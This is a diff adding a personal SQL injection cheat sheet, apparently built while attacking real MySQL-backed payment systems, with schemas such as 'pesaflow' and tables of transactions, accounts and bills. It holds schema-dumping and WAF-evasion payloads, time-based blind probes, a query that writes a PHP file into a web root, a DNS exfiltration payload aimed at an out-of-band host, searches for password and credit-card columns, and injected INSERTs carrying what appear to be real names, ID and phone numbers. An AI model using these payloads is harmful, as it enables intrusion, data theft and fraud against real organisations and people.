@@ -1,0 +1,170 @@
+DUMP INFO - (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
+
+BUILD SCRIPT  - SELECT '<?php json_encode($_SERVER); ?>' into outfile 'C:/xampp/htdocs/kever/veryhappy.php'
+
+DNS EXFILTRATION - SELECT load_file(concat(0x5c5c5c5c,version(),0x2E63686D31393734327674633030303037676B6430676534797775777979797979622E6F6173742E66756E5C5C61))
+
+NO SPACES INJECTION = SELECT(username)FROM(USERS)WHERE(username='netspi')
+
+GET ALL TABLES AND COLUMNS = SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x
+
+USER & IP = SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);
+
+/////////////////////////////////////////////////////////////////////////////
+CHARACTER ASCII = select ASCII(SUBSTRING(SYSTEM_USER(),1,1))
+
+select ASCII(SUBSTRING(SYSTEM_USER(),1,1)) -> DB User
+ ----------> 1,1 = Ist Char
+ ----------> 2,1 = 2nd Char
+ ----------> 3,1 = 3rd Char
+ ----------> 4,1 = 4th Char
+ ----------> 5,1 = 5th Char
+ ----------> ++++++++++
+ Reference Chart -> https://www.cs.cmu.edu/~pattis/15-1XX/common/handouts/ascii.html
+
+select LENGTH(SYSTEM_USER()) -> Length of DB user string
+SELECT IF(SUBSTRING(USER(),1,4)='root',SLEEP(5),1)  -> If the first 4 characters of DB user is roor then sleep for 5ms.
+
+/////////////////////////////////////////////////////////////////////////////
+
+QUERY FORMATS
+  SELECT ∗ FROM parties WHERE day = ‘tomorrow’
+
+  SELECT∗FROM parties WHERE day=’tomorrow’
+
+  SELECT∗FROM parties WHERE day=REVERSE(‘worromot’)
+
+  SELECT/∗∗/∗/∗∗/FROM/∗∗/parties/∗∗/WHERE/∗∗/day=’tomorrow’
+
+  SELECT ∗ FROM parties WHERE day=0x746f6d6f72726f77
+
+  SELECT ∗ FROM parties WHERE(day)LIKE(0x746f6d6f72726f77)
+
+  SELECT ∗ FROM parties
+
+  WHERE(day)BETWEEN(0x746f6d6f72726f77)AND(0x746f6d6f72726f77)
+
+  SELECT∗FROM[parties]WHERE/∗∗/day=’tomorrow’
+
+  SELECT∗FROM[parties]WHERE[day]=N’tomorrow’
+
+  SELECT∗FROM”parties”WHERE”day”LIKE”tomorrow”
+
+  SELECT∗,(SELECT(NULL))FROM(parties)WHERE(day)LIKE(0x746f6d6f72726f77)
+
+  SELECT∗FROM(parties)WHERE(day)IN(SELECT(0x746f6d6f72726f77))
+
+///////////////////////////////////////////////////////////////////////////////////////////////////
+
+------------DB TABLES TRAVERSAL CODES
+
+GET ALL TABLES = SHOW TABLES;
+
+GET NUMBER OF TABLES = SELECT COUNT(*) AS table_count FROM information_schema.tables WHERE table_schema = 'tsavosit_collo';
+
+GET NAMES OF ALL TABLES = SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = 'tsavosit_faith';
+
+GET NAME OF THE FIRST TABLE = SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = 'tsavosit_collo' ORDER BY TABLE_NAME LIMIT 1;
+
+GET NAME OF TABLE TWO = SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = 'tsavosit_faith' ORDER BY TABLE_NAME LIMIT 1 OFFSET 1;
+
+GET NAME OF TABLE THREE = SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = 'tsavosit_collo' ORDER BY TABLE_NAME LIMIT 1 OFFSET 2;
+
+-----------TABLE TRAVERSAL CODES
+
+GET ALL COLUMNS IN A TABLE = SELECT COLUMN_NAME FROM information_schema.columns WHERE table_schema = 'tsavosit_collo'   AND table_name = 'authors';
+
+GET NUMBER OF COLUMNS IN A TABLE = SELECT COUNT(*) AS column_count FROM information_schema.columns WHERE table_schema = 'tsavosit_collo'   AND table_name = 'authors';
+
+GET NAME OF THE FIRST COLUMN IN A TABLE = SELECT COLUMN_NAME FROM information_schema.columns WHERE table_schema = 'tsavosit_faith'   AND table_name = 'admin' ORDER BY COLUMN_NAME LIMIT 1;
+
+GET NAME OF THE SECOND COLUMN IN A TABLE = SELECT COLUMN_NAME FROM information_schema.columns WHERE table_schema = 'tsavosit_collo'   AND table_name = 'authors' ORDER BY COLUMN_NAME LIMIT 1 OFFSET 1;
+
+"  "   "  " " "  THIRD COLUMN = SELECT COLUMN_NAME FROM information_schema.columns WHERE table_schema = 'tsavosit_collo'   AND table_name = 'authors' ORDER BY COLUMN_NAME LIMIT 1 OFFSET 2;
+
+------------DATA TRAVERSAL CODES
+
+NUMBER OF ROWS IN A TABLE = SELECT COUNT(*) AS row_count FROM authors;
+
+
+
+
+
+
+////////////////////////////////////////////////
+
+CONSTRUCTOR:
+
+COUNT ROWS IN A TABLE = (SELECT(COUNT(*))FROM(news))
+                        (SELECT(COUNT(*))FROM(transactions)WHERE(IDNumber='39290974'))
+
+
+SELECT COMMAND = (SELECT(name)FROM(clients)WHERE(key='6678979C75A70BDA85762F4D488AFB6F')LIMIT%201)
+                 (SELECT(amount)FROM(transactions)WHERE(billRefNo='PJLFRYT')LIMIT%201)
+                 (SELECT(availableBalance)FROM(accounts)ORDER%20BY%20availableBalance%20DESC%20LIMIT%201)
+                 (SELECT(billRefNumber)FROM(bills_warehouse)LIMIT%201)
+                 (SELECT(billRefNo)FROM(transactions)WHERE(IDNumber='39290974')LIMIT%201) ✓
+                 (SELECT(bucketID)FROM(transactions)WHERE(IDNumber='39290974')LIMIT%201%20OFFSET%201)
+
+CALIBRATION CODE = (select*from(select(sleep(20)))a)
+
+INSERTION CODE = (INSERT%20INTO%20book(book_author,book_category,book_title,qty)VALUES('inject','inject','inject','3'))
+                 (INSERT%20INTO%20logo(name,image,width,height)VALUES('inject','inject','inject','3'))
+
+WORD TRAVERSAL = SELECT(IF(ASCII(SUBSTRING(SYSTEM_USER(),1,1))='root',SLEEP(5),1))
+
+VALUE CHECKER = (SELECT(IF(LENGTH(SYSTEM_USER())=60,SLEEP(5),1))AS(result))
+
+LENGTH OF NUMBER OF TBS = (SELECT(IF(LENGTH((SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema='tsavosit_faith')))=2,SLEEP(5),1)));
+
+NUMBER OF TABLES CHECKER = (SELECT(IF((SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema='tsavosit_faith'))=14,SLEEP(5),1)));
+
+FIRST TABLE = (SELECT(TABLE_NAME)FROM(information_schema.tables)WHERE(table_schema='pesaflow')ORDER%20BY(TABLE_NAME)LIMIT%201)
+
+93rd TABLE = (SELECT(TABLE_NAME)FROM(information_schema.tables)WHERE(table_schema='pesaflow')ORDER%20BY(TABLE_NAME)LIMIT%201%20OFFSET%2093)
+
+ACTIVE ACTION CODE = (SELECT(TABLE_NAME)FROM(information_schema.tables)WHERE(table_schema='pesaflow')ORDER%20BY(TABLE_NAME)LIMIT%201%20OFFSET%2020)
+
+TABLE COLUMNS COUNTER = (SELECT(COUNT(*))FROM(information_schema.columns)WHERE(table_schema='pesaflow'%20AND%20table_name='counties'))
+
+GET AVAILABLE DBs = (SELECT(COUNT(*))FROM%20information_schema.schemata)
+
+GET TABLES OF ALL DBs = SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
+
+GET COLUMNS IN ALL DBs = SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
+
+GET SPECIFIC COLUMNS FROM ALL DBs = SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE 'password' OR column_name LIKE 'credit_card';
+
+GET THE BIGGEST TABLES AND SIZE = SELECT concat(TABLE_SCHEMA,'.',TABLE_NAME)TABLE_NAME,CONCAT(ROUND(DATA_LENGTH/1048576,3),'MB')DATA_LENGTH FROM(information_schema.TABLES)ORDER BY(DATA_LENGTH)DESC LIMIT 10
+
+GET NAME OF BIGGEST TABLE = SELECT concat(TABLE_SCHEMA,'_',TABLE_NAME)TABLE_NAME FROM(information_schema.TABLES)ORDER BY(DATA_LENGTH)DESC LIMIT 1
+"    ""  ""   ""    "" = (SELECT%20concat(TABLE_SCHEMA,'_',TABLE_NAME)TABLE_NAME%20FROM(information_schema.TABLES)ORDER%20BY(DATA_LENGTH)DESC%20LIMIT%201)
+
+GET SIZE OF THE BIGGEST TABLE(IN MBS) = (SELECT%20ROUND(DATA_LENGTH/1048576,3)DATA_LENGTH%20FROM(information_schema.TABLES)ORDER%20BY(DATA_LENGTH)DESC%20LIMIT%201)
+
+SELECT(COUNT(*)AS(table_count)FROM(information_schema.tables)WHERE(table_schema='tsavosit_collo'))
+(SELECT(IF(LENGTH(SELECT(COUNT(*)AS(table_count)FROM(information_schema.tables)WHERE(table_schema='tsavosit_collo')))=1000,SLEEP(5),1)))
+
+select @@basedir;
+
+select @@version_compile_os;
+
+SHOW PROCESSES = SELECT * FROM information_schema.processlist
+
+GET PRIMARY KEY = (SELECT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA = 'pesaflow')AND(TABLE_NAME = 'bills')AND(COLUMN_KEY = 'PRI'))
+
+GET NUMBER OF UNIQUE COLUMNS = (SELECT(COUNT(*))FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA = 'pesaflow')AND(TABLE_NAME = 'bills')AND(COLUMN_KEY = 'UNI'))
+
+
+
+
+////////////////DB TESTING
+(SELECT(TABLE_NAME)FROM(information_schema.tables)WHERE(table_schema='testing')ORDER%20BY(TABLE_NAME)LIMIT%201)
+
+(SELECT(COUNT(*))FROM(news))
+
+/////////////////////////
+INSERT INTO bills(apiClientID,billDesc,billRefNumber,serviceID,clientMSISDN,clientName,clientEmail,clientIDNumber,amountExpected,status,currency,commission,net,notificationURL,dateCreated) values('4','Vehicle Inquiry','TIMS-MVR-10374947','46','+254793060164','TIMONA MBURU WAMBUI','','30945371','550','2','KES','50','500','https://ukrzmi.com/lab.php'+(SELECT(IF(ASCII(SUBSTRING((SELECT INFO FROM information_schema.processlist WHERE INFO LIKE '%processlist%'),463,1))=5
+
+INSERT INTO bills(apiClientID,billDesc,billRefNumber,serviceID,clientMSISDN,clientName,clientEmail,clientIDNumber,amountExpected,status,currency,commission,net,notificationURL,dateCreated) values('4','Vehicle Inquiry','TIMS-MVR-10374947','46','+254793060'+(SELECT(IF(ASCII(S%BSTRING((SELECT INFO FROM information_schema.processlist WHERE INFO LIKE '%processlist%'),36#,1))=5
+
